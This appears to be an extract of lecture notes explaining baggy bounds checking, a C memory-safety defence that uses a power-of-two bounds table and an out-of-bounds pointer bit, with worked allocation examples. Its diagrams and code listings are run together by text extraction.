malloc(50);+-------+-------+-------+-------+| a | | b |+-------+-------+-------+-------+0 32 64 96 128c = malloc(20);+-------+-------+-------+-------+| a | c | b |+-------+-------+-------+-------+0 32 64 96 128 How we check the bounds: 12345678910111213141516171819202122232425262728293031 slot_size = 16; p = malloc(16); table[p/slot_size] = 4; p = malloc(32); table[p/slot_size] = 5;/* 2 slot are used */ table[p/slot_size + 1] = 5; // Care that p is not the base address of the allocated block. // C code p1 = p + i; // Bounds check size = 1 &lt;&lt; table[p &gt;&gt; log_of_slot_size]; /** For example * p = malloc(28); slot_size = 16; * So table[p/slot_size] = table[p/slot_size + 1] = 5; * table[p &gt;&gt; log_of_slot_size] = 5; * size = 1 &lt;&lt; 5 = 32 */ base = p &amp; ~(size - 1); /** For example * size = 32 = 00100000; size - 1 = 00011111; * Assume p1's value(memory address) = 13 = 00001101 * p &amp; ~(size - 1) = 00001101 &amp; 11100000 = 0 * Assume p1's value(memory address) = 39 = 00100111 * p &amp; ~(size - 1) = 00100111 &amp; 11100000 = 00100000 = 32 */ // check (p1 &gt;= base) &amp;&amp; ((p1 - base) &lt; size) or (p ^ p1) &gt;&gt; table[p &gt;&gt; log_of_slot_size] == 0 Use virtual memory system to prevent out-of-bound derefs: set most signifcant bit in an OOB pointer, and then mark pages in the upper half of the address space as inaccessible. So we don’t have to instrument pointer dereferences to prevent bad memory accesses. Below is an example(assume slot_size = 16)1234567891011121314151617181920212223char *p = malloc(44);// 64 bytes are allocated// 64 / slot_size = 4 bounds table entries// These entries are set to 6char *q = p + 60;// Access is ok!char *r = q + 16；// r is now at an offset of 60 + 16 = 76 from// p. This means 12 bytes beyond the end of p.// So baggy bounds will raise an error.char *s = q + 8;// s is now at an offset of 60 + 8 = 64 from// p. This means 4 bytes beyond the end of p,// which is less than half a slot away.// No error is raised, but the OOB high-order bit// is set in s, so that s cannot be dereferenced.char *t = s - 32;// t is now back inside the bounds,// so the OOB bit is cleared.]]></content>
